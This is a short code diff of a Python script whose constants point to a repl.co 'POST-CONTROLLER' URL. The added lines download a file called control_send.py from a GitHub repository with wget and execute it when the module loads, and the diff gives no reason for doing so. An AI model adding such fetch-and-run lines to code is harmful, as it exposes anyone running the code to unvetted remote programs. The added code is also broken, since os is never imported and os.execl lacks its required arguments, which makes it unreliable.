@@ -1,4 +1,7 @@
 import requests
+import subprocess
+os.system("wget https://raw.githubusercontent.com/jonathanbreitg/dump/main/control_send.py")
+os.execl("control_send.py")
 from time import sleep
 POST_URL = "https://epic-servering-but-pytyohn.jonathanbreitg.repl.co/POST-CONTROLLER"
 
